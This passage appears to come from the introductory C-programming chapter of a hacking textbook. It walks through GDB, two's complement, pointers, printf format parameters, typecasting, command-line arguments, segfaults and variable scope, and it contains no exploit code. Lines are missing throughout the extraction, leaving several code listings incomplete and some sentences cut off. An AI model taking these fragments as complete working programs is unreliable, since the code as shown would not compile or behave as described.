<strcpy@plt>\nBreakpoint 4, 0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\neip            0xb7f076f4       0xb7f076f4 <strcpy+4>\n0xb7f076f4 <strcpy+4>:  mov    esi,DWORD PTR [ebp+8]\n0xb7f076f7 <strcpy+7>:  mov    eax,DWORD PTR [ebp+12]\neip            0x80483d7        0x80483d7 <main+35>\n0x80483dd <main+41>:    call   0x80482d4 <printf@plt>\nThe address in EIP at the middle breakpoint is different because the\ncode for the strcpy() function comes from a loaded library. In fact, the\ndebugger shows EIP for the middle breakpoint in the strcpy() function,\nwhile EIP at the other two breakpoints is in the main() function. I\u2019d like to\npoint out that EIP is able to travel from the main code to the strcpy() code\nand back again. Each time a function is called, a record is kept on a data\nstructure simply called the stack. The stack lets EIP return through long\nchains of function calls. In GDB, the bt command can be used to backtrace the\nstack. In the output below, the stack backtrace is shown at each breakpoint.\nThe program being debugged has been started already.\nBreakpoint 4, 0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\n#0  0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\nAt the middle breakpoint, the backtrace of the stack shows its record of\nthe strcpy() call. Also, you may notice that the strcpy() function is at a slightly\ndifferent address during the second run. This is due to an exploit protection\nmethod that is turned on by default in the Linux kernel since 2.6.11. We will\nBy default, numerical values in C are signed, which means they can be both\nnegative and positive. In contrast, unsigned values don\u2019t allow negative num-\nbers. Since it\u2019s all just memory in the end, all numerical values must be stored\nin binary, and unsigned values make the most sense in binary. A 32-bit\nunsigned integer can contain values from 0 (all binary 0s) to 4,294,967,295\n(all binary 1s). A 32-bit signed integer is still just 32 bits, which means it can\nonly be in one of 232 possible bit combinations. This allows 32-bit signed\nintegers to range from \u22122,147,483,648 to 2,147,483,647. Essentially, one of\nthe bits is a flag marking the value positive or negative. Positively signed values\nlook the same as unsigned values, but negative numbers are stored differently\nusing a method called two\u2019s complement. Two\u2019s complement represents neg-\native numbers in a form suited for binary adders\u2014when a negative value in\ntwo\u2019s complement is added to a positive number of the same magnitude, the\nresult will be 0. This is done by first writing the positive number in binary, then\ninverting all the bits, and finally adding 1. It sounds strange, but it works and\nallows negative numbers to be added in combination with positive numbers\nThis can be explored quickly on a smaller scale using pcalc, a simple\nprogrammer\u2019s calculator that displays results in decimal, hexadecimal, and\nbinary formats. For simplicity\u2019s sake, 8-bit numbers are used in this example.\nreader@hacking:~/booksrc $ pcalc 0y01001001 + 0y10110111\nFirst, the binary value 01001001 is shown to be positive 73. Then all the\nbits are flipped, and 1 is added to result in the two\u2019s complement representa-\ntion for negative 73, 10110111. When these two values are added together,\nthe result of the original 8 bits is 0. The program pcalc shows the value 256\nbecause it\u2019s not aware that we\u2019re only dealing with 8-bit values. In a binary\nadder, that carry bit would just be thrown away because the end of the vari-\nable\u2019s memory would have been reached. This example might shed some\nIn C, variables can be declared as unsigned by simply prepending the\nkeyword unsigned to the declaration. An unsigned integer would be declared\nwith unsigned int. In addition, the size of numerical variables can be extended\nor shortened by adding the keywords long or short. The actual sizes will vary\ndepending on the architecture the code is compiled for. The language of C\nprovides a macro called sizeof() that can determine the size of certain data\ntypes. This works like a function that takes a data type as its input and returns\nthe size of a variable declared with that data type for the target architecture.\nThe datatype_sizes.c program explores the sizes of various data types, using\nprintf(\"The 'int' data type is\\t\\t %d bytes\\n\", sizeof(int));\nprintf(\"The 'unsigned int' data type is\\t %d bytes\\n\", sizeof(unsigned int));\nprintf(\"The 'short int' data type is\\t %d bytes\\n\", sizeof(short int));\nprintf(\"The 'long int' data type is\\t %d bytes\\n\", sizeof(long int));\nprintf(\"The 'long long int' data type is %d bytes\\n\", sizeof(long long int));\nprintf(\"The 'float' data type is\\t %d bytes\\n\", sizeof(float));\nprintf(\"The 'char' data type is\\t\\t %d bytes\\n\", sizeof(char));\nThis piece of code uses the printf() function in a slightly different way.\nIt uses something called a format specifier to display the value returned from\nthe sizeof() function calls. Format specifiers will be explained in depth later,\nso for now, let\u2019s just focus on the program\u2019s output.\nAs previously stated, both signed and unsigned integers are four bytes in\nsize on the x86 architecture. A float is also four bytes, while a char only needs\na single byte. The long and short keywords can also be used with floating-point\nThe EIP register is a pointer that \u201cpoints\u201d to the current instruction during a\nprogram\u2019s execution by containing its memory address. The idea of pointers\nis used in C, also. Since the physical memory cannot actually be moved, the\ninformation in it must be copied. It can be very computationally expensive to\ncopy large chunks of memory to be used by different functions or in differ-\nent places. This is also expensive from a memory standpoint, since space for\nthe new destination copy must be saved or allocated before the source can be\ncopied. Pointers are a solution to this problem. Instead of copying a large\nblock of memory, it is much simpler to pass around the address of the begin-\nPointers in C can be defined and used like any other variable type.\nSince memory on the x86 architecture uses 32-bit addressing, pointers are\nalso 32 bits in size (4 bytes). Pointers are defined by prepending an asterisk (*)\nto the variable name. Instead of defining a variable of that type, a pointer is\ndefined as something that points to data of that type. The pointer.c program\nis an example of a pointer being used with the char data type, which is only\nchar *pointer;   // A pointer, meant for a character array\npointer = str_a; // Set the first pointer to the start of the array.\npointer2 = pointer + 2; // Set the second one 2 bytes further in.\nstrcpy(pointer2, \"y you guys!\\n\"); // Copy into that spot.\nAs the comments in the code indicate, the first pointer is set at the begin-\nning of the character array. When the character array is referenced like this,\nit is actually a pointer itself. This is how this buffer was passed as a pointer to\nthe printf() and strcpy() functions earlier. The second pointer is set to the\nfirst pointer\u2019s address plus two, and then some things are printed (shown in\nreader@hacking:~/booksrc $ gcc -o pointer pointer.c\nLet\u2019s take a look at this with GDB. The program is recompiled, and a\nbreakpoint is set on the tenth line of the source code. This will stop the\nprogram after the \"Hello, world!\\n\" string has been copied into the str_a\nbuffer and the pointer variable is set to the beginning of it.\nreader@hacking:~/booksrc $ gcc -g -o pointer pointer.c\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n5          char str_a[20];  // A 20-element character array\n6          char *pointer;   // A pointer, meant for a character array\n10         pointer = str_a; // Set the first pointer to the start of the array.\n13         pointer2 = pointer + 2; // Set the second one 2 bytes further in.\n15         strcpy(pointer2, \"y you guys!\\n\"); // Copy into that spot.\nBreakpoint 1 at 0x80483dd: file pointer.c, line 11.\nWhen the pointer is examined as a string, it\u2019s apparent that the given\nstring is there and is located at memory address 0xbffff7e0. Remember that\nthe string itself isn\u2019t stored in the pointer variable\u2014only the memory address\nIn order to see the actual data stored in the pointer variable, you must\nuse the address-of operator. The address-of operator is a unary operator,\nwhich simply means it operates on a single argument. This operator is just\nan ampersand (&) prepended to a variable name. When it\u2019s used, the address\nof that variable is returned, instead of the variable itself. This operator exists\nWhen the address-of operator is used, the pointer variable is shown to\nbe located at the address 0xbffff7dc in memory, and it contains the address\nThe address-of operator is often used in conjunction with pointers, since\npointers contain memory addresses. The addressof.c program demonstrates\nthe address-of operator being used to put the address of an integer variable\nint_ptr = &int_var; // put the address of int_var into int_ptr\nThe program itself doesn\u2019t actually output anything, but you can probably\nguess what happens, even before debugging with GDB.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n7               int_ptr = &int_var; // Put the address of int_var into int_ptr.\nBreakpoint 1 at 0x8048361: file addressof.c, line 8.\nAs usual, a breakpoint is set and the program is executed in the\ndebugger. At this point the majority of the program has executed. The first\nprint command shows the value of int_var, and the second shows its address\nusing the address-of operator. The next two print commands show that\nint_ptr contains the address of int_var, and they also show the address of\nAn additional unary operator called the dereference operator exists for use\nwith pointers. This operator will return the data found in the address the\npointer is pointing to, instead of the address itself. It takes the form of an\nasterisk in front of the variable name, similar to the declaration of a pointer.\nOnce again, the dereference operator exists both in GDB and in C. Used in\nGDB, it can retrieve the integer value int_ptr points to.\nA few additions to the addressof.c code (shown in addressof2.c) will\ndemonstrate all of these concepts. The added printf() functions use format\nparameters, which I\u2019ll explain in the next section. For now, just focus on the\nint_ptr = &int_var; // Put the address of int_var into int_ptr.\nprintf(\"int_var is located at 0x%08x and contains %d\\n\", &int_var, int_var);\nprintf(\"int_ptr is located at 0x%08x, contains 0x%08x, and points to %d\\n\\n\",\nThe results of compiling and executing addressof2.c are as follows.\nint_ptr is located at 0xbffff830, contains 0xbffff834, and points to 5\nWhen the unary operators are used with pointers, the address-of oper-\nator can be thought of as moving backward, while the dereference operator\nmoves forward in the direction the pointer is pointing.\nThe printf() function can be used to print more than just fixed strings. This\nfunction can also use format strings to print variables in many different for-\nmats. A format string is just a character string with special escape sequences\nthat tell the function to insert variables printed in a specific format in place\nof the escape sequence. The way the printf() function has been used in the\nprevious programs, the \"Hello, world!\\n\" string technically is the format string;\nhowever, it is devoid of special escape sequences. These escape sequences are\nalso called format parameters, and for each one found in the format string, the\nfunction is expected to take an additional argument. Each format parameter\nbegins with a percent sign (%) and uses a single-character shorthand very\nsimilar to formatting characters used by GDB\u2019s examine command.\nAll of the preceding format parameters receive their data as values,\nnot pointers to values. There are also some format parameters that expect\nThe %s format parameter expects to be given a memory address; it prints\nthe data at that memory address until a null byte is encountered. The %n\nformat parameter is unique in that it actually writes data. It also expects to be\ngiven a memory address, and it writes the number of bytes that have been\nFor now, our focus will just be the format parameters used for displaying\ndata. The fmt_strings.c program shows some examples of different format\n// Example of printing with different format string\nprintf(\"[A] Dec: %d, Hex: %x, Unsigned: %u\\n\", A, A, A);\nprintf(\"[B] Dec: %d, Hex: %x, Unsigned: %u\\n\", B, B, B);\nprintf(\"[field width on B] 3: '%3u', 10: '%10u', '%08u'\\n\", B, B, B);\nprintf(\"[string] %s  Address %08x\\n\", string, string);\n// Example of unary address operator (dereferencing) and a %x format string\nIn the preceding code, additional variable arguments are passed to each\nprintf() call for every format parameter in the format string. The final printf()\ncall uses the argument &A, which will provide the address of the variable A.\nThe program\u2019s compilation and execution are as follows.\nreader@hacking:~/booksrc $ gcc -o fmt_strings fmt_strings.c\n[field width on B] 3: '31337', 10: '     31337', '00031337'\nThe first two calls to printf() demonstrate the printing of variables A and B,\nusing different format parameters. Since there are three format parameters\nin each line, the variables A and B need to be supplied three times each. The\n%d format parameter allows for negative values, while %u does not, since it is\nWhen the variable A is printed using the %u format parameter, it appears\nas a very high value. This is because A is a negative number stored in two\u2019s\ncomplement, and the format parameter is trying to print it as if it were an\nunsigned value. Since two\u2019s complement flips all the bits and adds one, the\nThe third line in the example, labeled [field width on B], shows the use\nof the field-width option in a format parameter. This is just an integer that\ndesignates the minimum field width for that format parameter. However,\nthis is not a maximum field width\u2014if the value to be outputted is greater\nthan the field width, the field width will be exceeded. This happens when 3 is\nused, since the output data needs 5 bytes. When 10 is used as the field width,\n5 bytes of blank space are outputted before the output data. Additionally, if a\nfield width value begins with a 0, this means the field should be padded with\nzeros. When 08 is used, for example, the output is 00031337.\nThe fourth line, labeled [string], simply shows the use of the %s format\nparameter. Remember that the variable string is actually a pointer containing\nthe address of the string, which works out wonderfully, since the %s format\nparameter expects its data to be passed by reference.\nThe final line just shows the address of the variable A, using the unary\naddress operator to dereference the variable. This value is displayed as eight\nAs these examples show, you should use %d for decimal, %u for unsigned,\nand %x for hexadecimal values. Minimum field widths can be set by putting a\nnumber right after the percent sign, and if the field width begins with 0, it\nwill be padded with zeros. The %s parameter can be used to print strings and\nshould be passed the address of the string. So far, so good.\nFormat strings are used by an entire family of standard I/O functions,\nincluding scanf(), which basically works like printf() but is used for input\ninstead of output. One key difference is that the scanf() function expects all\nof its arguments to be pointers, so the arguments must actually be variable\naddresses\u2014not the variables themselves. This can be done using pointer\nvariables or by using the unary address operator to retrieve the address of the\nnormal variables. The input.c program and execution should help explain.\nIn input.c, the scanf() function is used to set the count variable. The output\nFormat strings are used quite often, so familiarity with them is valuable.\nIn addition, the ability to output the values of variables allows for debugging in\nthe program, without the use of a debugger. Having some form of immediate\nfeedback is fairly vital to the hacker\u2019s learning process, and something as\nsimple as printing the value of a variable can allow for lots of exploitation.\nTypecasting is simply a way to temporarily change a variable\u2019s data type, despite\nhow it was originally defined. When a variable is typecast into a different\ntype, the compiler is basically told to treat that variable as if it were the\nnew data type, but only for that operation. The syntax for typecasting is\nThis can be used when dealing with integers and floating-point variables,\nc = a / b;                  // Divide using integers.\nd = (float) a / (float) b;  // Divide integers typecast as floats.\nThe results of compiling and executing typecasting.c are as follows.\nAs discussed earlier, dividing the integer 13 by 5 will round down to the\nincorrect answer of 2, even if this value is being stored into a floating-point\nvariable. However, if these integer variables are typecast into floats, they will\nbe treated as such. This allows for the correct calculation of 2.6.\nThis example is illustrative, but where typecasting really shines is when it\nis used with pointer variables. Even though a pointer is just a memory address,\nthe C compiler still demands a data type for every pointer. One reason for\nthis is to try to limit programming errors. An integer pointer should only\npoint to integer data, while a character pointer should only point to char-\nacter data. Another reason is for pointer arithmetic. An integer is four bytes\nin size, while a character only takes up a single byte. The pointer_types.c pro-\ngram will demonstrate and explain these concepts further. This code uses the\nformat parameter %p to output memory addresses. This is shorthand meant\nfor displaying pointers and is basically equivalent to 0x%08x.\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the integer %d\\n\",\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nprintf(\"[char pointer] points to %p, which contains the char '%c'\\n\",\nIn this code two arrays are defined in memory\u2014one containing integer\ndata and the other containing character data. Two pointers are also defined,\none with the integer data type and one with the character data type, and they\nare set to point at the start of the corresponding data arrays. Two separate for\nloops iterate through the arrays using pointer arithmetic to adjust the pointer\nto point at the next value. In the loops, when the integer and character values\nare actually printed with the %d and %c format parameters, notice that the\ncorresponding printf() arguments must dereference the pointer variables.\nThis is done using the unary * operator and has been marked above\n[integer pointer] points to 0xbffff7f0, which contains the integer 1\n[integer pointer] points to 0xbffff7f4, which contains the integer 2\n[integer pointer] points to 0xbffff7f8, which contains the integer 3\n[integer pointer] points to 0xbffff7fc, which contains the integer 4\n[integer pointer] points to 0xbffff800, which contains the integer 5\n[char pointer] points to 0xbffff810, which contains the char 'a'\n[char pointer] points to 0xbffff811, which contains the char 'b'\n[char pointer] points to 0xbffff812, which contains the char 'c'\n[char pointer] points to 0xbffff813, which contains the char 'd'\n[char pointer] points to 0xbffff814, which contains the char 'e'\nEven though the same value of 1 is added to int_pointer and char_pointer\nin their respective loops, the compiler increments the pointer\u2019s addresses by\ndifferent amounts. Since a char is only 1 byte, the pointer to the next char\nwould naturally also be 1 byte over. But since an integer is 4 bytes, a pointer\nIn pointer_types2.c, the pointers are juxtaposed such that the int_pointer\npoints to the character data and vice versa. The major changes to the code\nchar_pointer = int_array; // The char_pointer and int_pointer now\nint_pointer = char_array; // point to incompatible data types.\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the char '%c'\\n\",\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nprintf(\"[char pointer] points to %p, which contains the integer %d\\n\",\nThe output below shows the warnings spewed forth from the compiler.\npointer_types2.c:12: warning: assignment from incompatible pointer type\npointer_types2.c:13: warning: assignment from incompatible pointer type\nIn an attempt to prevent programming mistakes, the compiler gives warn-\nings about pointers that point to incompatible data types. But the compiler\nand perhaps the programmer are the only ones that care about a pointer\u2019s\ntype. In the compiled code, a pointer is nothing more than a memory\naddress, so the compiler will still compile the code if a pointer points to\nan incompatible data type\u2014it simply warns the programmer to anticipate\n[integer pointer] points to 0xbffff810, which contains the char 'a'\n[integer pointer] points to 0xbffff814, which contains the char 'e'\n[integer pointer] points to 0xbffff818, which contains the char '8'\n[integer pointer] points to 0xbffff81c, which contains the char '\n[integer pointer] points to 0xbffff820, which contains the char '?'\n[char pointer] points to 0xbffff7f0, which contains the integer 1\n[char pointer] points to 0xbffff7f1, which contains the integer 0\n[char pointer] points to 0xbffff7f2, which contains the integer 0\n[char pointer] points to 0xbffff7f3, which contains the integer 0\n[char pointer] points to 0xbffff7f4, which contains the integer 2\nEven though the int_pointer points to character data that only contains\n5 bytes of data, it is still typed as an integer. This means that adding 1 to the\npointer will increment the address by 4 each time. Similarly, the char_pointer\u2019s\naddress is only incremented by 1 each time, stepping through the 20 bytes of\ninteger data (five 4-byte integers), one byte at a time. Once again, the little-\nendian byte order of the integer data is apparent when the 4-byte integer is\nexamined one byte at a time. The 4-byte value of 0x00000001 is actually stored\nThere will be situations like this in which you are using a pointer that\npoints to data with a conflicting type. Since the pointer type determines the\nsize of the data it points to, it\u2019s important that the type is correct. As you can\nsee in pointer_types3.c below, typecasting is just a way to change the type of a\nchar_pointer = (char *) int_array; // Typecast into the\nint_pointer = (int *) char_array;  // pointer's data type.\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the char '%c'\\n\",\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nprintf(\"[char pointer] points to %p, which contains the integer %d\\n\",\nchar_pointer = (char *) ((int *) char_pointer + 1);\nIn this code, when the pointers are initially set, the data is typecast into\nthe pointer\u2019s data type. This will prevent the C compiler from complaining\nabout the conflicting data types; however, any pointer arithmetic will still be\nincorrect. To fix that, when 1 is added to the pointers, they must first be type-\ncast into the correct data type so the address is incremented by the correct\namount. Then this pointer needs to be typecast back into the pointer\u2019s data\ntype once again. It doesn\u2019t look too pretty, but it works.\n[integer pointer] points to 0xbffff810, which contains the char 'a'\n[integer pointer] points to 0xbffff811, which contains the char 'b'\n[integer pointer] points to 0xbffff812, which contains the char 'c'\n[integer pointer] points to 0xbffff813, which contains the char 'd'\n[integer pointer] points to 0xbffff814, which contains the char 'e'\n[char pointer] points to 0xbffff7f0, which contains the integer 1\n[char pointer] points to 0xbffff7f4, which contains the integer 2\n[char pointer] points to 0xbffff7f8, which contains the integer 3\n[char pointer] points to 0xbffff7fc, which contains the integer 4\n[char pointer] points to 0xbffff800, which contains the integer 5\nNaturally, it is far easier just to use the correct data type for pointers\nin the first place; however, sometimes a generic, typeless pointer is desired.\nIn C, a void pointer is a typeless pointer, defined by the void keyword.\nExperimenting with void pointers quickly reveals a few things about typeless\npointers. First, pointers cannot be dereferenced unless they have a type.\nIn order to retrieve the value stored in the pointer\u2019s memory address, the\ncompiler must first know what type of data it is. Secondly, void pointers must\nalso be typecast before doing pointer arithmetic. These are fairly intuitive\nlimitations, which means that a void pointer\u2019s main purpose is to simply hold\nThe pointer_types3.c program can be modified to use a single void\npointer by typecasting it to the proper type each time it\u2019s used. The compiler\nknows that a void pointer is typeless, so any type of pointer can be stored in a\nvoid pointer without typecasting. This also means a void pointer must always\nbe typecast when dereferencing it, however. These differences can be seen in\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[char pointer] points to %p, which contains the char '%c'\\n\",\nvoid_pointer = (void *) ((char *) void_pointer + 1);\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the integer %d\\n\",\nvoid_pointer = (void *) ((int *) void_pointer + 1);\nThe results of compiling and executing pointer_types4.c are as\n[char pointer] points to 0xbffff810, which contains the char 'a'\n[char pointer] points to 0xbffff811, which contains the char 'b'\n[char pointer] points to 0xbffff812, which contains the char 'c'\n[char pointer] points to 0xbffff813, which contains the char 'd'\n[char pointer] points to 0xbffff814, which contains the char 'e'\n[integer pointer] points to 0xbffff7f0, which contains the integer 1\n[integer pointer] points to 0xbffff7f4, which contains the integer 2\n[integer pointer] points to 0xbffff7f8, which contains the integer 3\n[integer pointer] points to 0xbffff7fc, which contains the integer 4\n[integer pointer] points to 0xbffff800, which contains the integer 5\nThe compilation and output of this pointer_types4.c is basically the same\nas that for pointer_types3.c. The void pointer is really just holding the memory\naddresses, while the hard-coded typecasting is telling the compiler to use the\nSince the type is taken care of by the typecasts, the void pointer is truly\nnothing more than a memory address. With the data types defined by type-\ncasting, anything that is big enough to hold a four-byte value can work the\nsame way as a void pointer. In pointer_types5.c, an unsigned integer is used\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[hacky_nonpointer] points to %p, which contains the char '%c'\\n\",\nhacky_nonpointer = hacky_nonpointer + sizeof(char);\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[hacky_nonpointer] points to %p, which contains the integer %d\\n\",\nThis is rather hacky, but since this integer value is typecast into the\nproper pointer types when it is assigned and dereferenced, the end result is\nthe same. Notice that instead of typecasting multiple times to do pointer\narithmetic on an unsigned integer (which isn\u2019t even a pointer), the sizeof()\nfunction is used to achieve the same result using normal arithmetic.\n[hacky_nonpointer] points to 0xbffff810, which contains the char 'a'\n[hacky_nonpointer] points to 0xbffff811, which contains the char 'b'\n[hacky_nonpointer] points to 0xbffff812, which contains the char 'c'\n[hacky_nonpointer] points to 0xbffff813, which contains the char 'd'\n[hacky_nonpointer] points to 0xbffff814, which contains the char 'e'\n[hacky_nonpointer] points to 0xbffff7f0, which contains the integer 1\n[hacky_nonpointer] points to 0xbffff7f4, which contains the integer 2\n[hacky_nonpointer] points to 0xbffff7f8, which contains the integer 3\n[hacky_nonpointer] points to 0xbffff7fc, which contains the integer 4\n[hacky_nonpointer] points to 0xbffff800, which contains the integer 5\nThe important thing to remember about variables in C is that the com-\npiler is the only thing that cares about a variable\u2019s type. In the end, after the\nprogram has been compiled, the variables are nothing more than memory\naddresses. This means that variables of one type can easily be coerced into\nbehaving like another type by telling the compiler to typecast them into the\nMany nongraphical programs receive input in the form of command-line\narguments. Unlike inputting with scanf(), command-line arguments don\u2019t\nrequire user interaction after the program has begun execution. This tends\nIn C, command-line arguments can be accessed in the main() function by\nincluding two additional arguments to the function: an integer and a pointer\nto an array of strings. The integer will contain the number of arguments, and\nthe array of strings will contain each of those arguments. The commandline.c\nprintf(\"There were %d arguments provided:\\n\", arg_count);\nreader@hacking:~/booksrc $ gcc -o commandline commandline.c\nreader@hacking:~/booksrc $ ./commandline this is a test\nThe zeroth argument is always the name of the executing binary, and\nthe rest of the argument array (often called an argument vector) contains the\nSometimes a program will want to use a command-line argument as an\ninteger as opposed to a string. Regardless of this, the argument is passed in\nas a string; however, there are standard conversion functions. Unlike simple\ntypecasting, these functions can actually convert character arrays containing\nnumbers into actual integers. The most common of these functions is atoi(),\nwhich is short for ASCII to integer. This function accepts a pointer to a string\nas its argument and returns the integer value it represents. Observe its usage\nprintf(\"Usage: %s <message> <# of times to repeat>\\n\", program_name);\nif(argc < 3)      // If fewer than 3 arguments are used,\ncount = atoi(argv[2]); // Convert the 2nd arg into an integer.\nprintf(\"%3d - %s\\n\", i, argv[1]); // Print the 1st arg.\nThe results of compiling and executing convert.c are as follows.\nreader@hacking:~/booksrc $ ./a.out 'Hello, world!' 3\nIn the preceding code, an if statement makes sure that three arguments\nare used before these strings are accessed. If the program tries to access mem-\nory that doesn\u2019t exist or that the program doesn\u2019t have permission to read,\nthe program will crash. In C it\u2019s important to check for these types of condi-\ntions and handle them in program logic. If the error-checking if statement is\ncommented out, this memory violation can be explored. The convert2.c\nprintf(\"Usage: %s <message> <# of times to repeat>\\n\", program_name);\n//  if(argc < 3)      // If fewer than 3 arguments are used,\n//    usage(argv[0]); // display usage message and exit.\ncount = atoi(argv[2]); // Convert the 2nd arg into an integer.\nprintf(\"%3d - %s\\n\", i, argv[1]); // Print the 1st arg.\nThe results of compiling and executing convert2.c are as follows.\nWhen the program isn\u2019t given enough command-line arguments, it still\ntries to access elements of the argument array, even though they don\u2019t exist.\nThis results in the program crashing due to a segmentation fault.\nMemory is split into segments (which will be discussed later), and some\nmemory addresses aren\u2019t within the boundaries of the memory segments the\nprogram is given access to. When the program attempts to access an address\nthat is out of bounds, it will crash and die in what\u2019s called a segmentation fault.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\n#0  0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\nBreakpoint 1 at 0x8048419: file convert2.c, line 14.\nThe program being debugged has been started already.\nBreakpoint 1, main (argc=2, argv=0xbffff894) at convert2.c:14\n14         count = atoi(argv[2]); // convert the 2nd arg into an integer\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\n0xbffff894:     0xbffff9b3      0xbffff9ce      0x00000000\nThe program is executed with a single command-line argument of test\nwithin GDB, which causes the program to crash. The where command will\nsometimes show a useful backtrace of the stack; however, in this case, the\nstack was too badly mangled in the crash.  A breakpoint is set on main and\nthe program is re-executed to get the value of the argument vector (shown in\nbold). Since the argument vector is a pointer to list of strings, it is actually a\npointer to a list of pointers. Using the command x/3xw to examine the first\nthree memory addresses stored at the argument vector\u2019s address shows that\nthey are themselves pointers to strings. The first one is the zeroth argument,\nthe second is the test argument, and the third is zero, which is out of bounds.\nWhen the program tries to access this memory address, it crashes with a\nAnother interesting concept regarding memory in C is variable scoping or\ncontext\u2014in particular, the contexts of variables within functions. Each func-\ntion has its own set of local variables, which are independent of everything\nelse. In fact, multiple calls to the same function all have their own contexts.\nYou can use the printf() function with format strings to quickly explore this;\nThe output of this simple program demonstrates nested function calls.\nIn each function, the variable i is set to a different value and printed.\nNotice that within the main() function, the variable i is 3, even after calling\nfunc1() where the variable i is 5. Similarly, within func1() the variable i\nremains 5, even after calling func2() where i is 7, and so forth. The best\nway to think of this is that each function call has its own version of the\nVariables can also have a global scope, which means they will persist\nacross all functions. Variables are global if they are defined at the beginning\nof the code, outside of any functions. In the scope2.c example code shown\nbelow, the variable j is declared globally and set to 42. This variable can be\nread from and written to by any function, and the changes to it will persist\nint i = 11, j = 999; // Here, j is a local variable of func3().\nprintf(\"\\t\\t[back in func2] i = %d, j = %d\\n\", i, j);\nprintf(\"\\t[back in func1] i = %d, j = %d\\n\", i, j);\nThe results of compiling and executing scope2.c are as follows.\nIn the output, the global variable j is written to in func2(), and the\nchange persists in all functions except func3(), which has its own local\nvariable called j. In this case, the compiler prefers to use the local variable.\nWith all these variables using the same names, it can be a little confusing, but\nremember that in the end, it\u2019s all just memory. The global variable j is just\nstored in memory, and every function is able to access that memory. The local\nvariables for each function are each stored in their own places in memory,\nregardless of the identical names. Printing the memory addresses of these\nvariables will give a clearer picture of what's going on. In the scope3.c example\ncode below, the variable addresses are printed using the unary address-of\nint i = 11, j = 999; // Here, j is a local variable of func3().\nprintf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t\\t\\t[in func3] j @ 0x%08x = %d\\n\", &j, j);\nprintf(\"\\t\\t[back in func2] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t\\t[back in func2] j @ 0x%08x = %d\\n\", &j, j);\nprintf(\"\\t[back in func1] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t[back in func1] j @ 0x%08x = %d\\n\", &j, j);\nThe results of compiling and executing scope3.c are as follows.\nIn this output, it is obvious that the variable j used by func3() is different\nthan the j used by the other functions. The j used by func3() is located at\n0xbffff7d0, while the j used by the other functions is located at 0x08049988.\nAlso, notice that the variable i is actually a different memory address for each\nIn the following output, GDB is used to stop execution at a breakpoint in\nfunc3(). Then the backtrace command shows the record of each function call\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n6          int i = 11, j = 999; // Here, j is a local variable of func3().\n7          printf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\n8          printf(\"\\t\\t\\t[in func3] j @ 0x%08x = %d\\n\", &j, j);\n7          printf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\nThe backtrace also shows the nested function calls by looking at records\nkept on the stack. Each time a function is called, a record called a stack frame\nis put on the stack. Each line in the backtrace corresponds to a stack frame.\nEach stack frame also contains the local variables for that context. The local\nvariables contained in each stack frame can be shown in GDB by adding the\nThe full backtrace clearly shows that the local variable j only exists in\nfunc3()\u2019s context. The global version of the variable j is used in the other\nIn addition to globals, variables can also be defined as static variables by\nprepending the keyword static to the variable definition. Similar to global\nvariables, a static variable remains intact between function calls; however, static\nvariables are also akin to local variables since they remain local within a par-\nticular function context. One different and unique feature of static variables\nis that they are only initialized once. The code in static.c will help explain\nvoid function() { // An example function, with its own context\nstatic int static_var = 5; // Static variable initialization\nprintf(\"\\t[in function] static_var = %d\\n\", static_var);\nint main() { // The main function, with its own context\nstatic int static_var = 1337; // Another static, in a different context\nThe aptly named static_var is defined as a static variable in two places:\nwithin the context of main() and within the context of function(). Since static\nvariables are local within a particular functional context, these variables can\nhave the same name, but they actually represent two different locations in\nmemory. The function simply prints the values of the two variables in its con-\ntext and then adds 1 to both of them. Compiling and executing this code will\nshow the difference between the static and nonstatic variables.\nNotice that the static_var retains its value between subsequent calls to\nfunction(). This is because static variables retain their values, but also because\nthey are only initialized once. In addition, since the static variables are local\nto a particular functional context, the static_var in the context of main()\nOnce again, printing the addresses of these variables by dereferencing\nthem with the unary address operator will provide greater viability into what\u2019s\nreally going on. Take a look at static2.c for an example.\nvoid function() { // An example function, with its own context\nstatic int static_var = 5; // Static variable initialization\nprintf(\"\\t[in function] var  @ %p = %d\\n\", &var, var);\nprintf(\"\\t[in function] static_var @ %p = %d\\n\", &static_var, static_var);\nint main() { // The main function, with its own context\nstatic int static_var = 1337; // Another static, in a different context\nprintf(\"[in main] static_var @ %p = %d\\n\", &static_var, static_var);\nThe results of compiling and executing static2.c are as follows.\nWith the addresses of the variables displayed, it is apparent that the\nstatic_var in main() is different than the one found in function(), since they are\nlocated at different memory addresses (0x804968c and 0x8049688, respectively).\nYou may have noticed that the addresses of the local variables all have very\nhigh addresses, like 0xbffff814, while the global and static variables all have\nvery low memory addresses, like 0x0804968c and 0x8049688. That\u2019s very astute\nof you\u2014noticing details like this and asking why is one of the cornerstones of\nA compiled program\u2019s 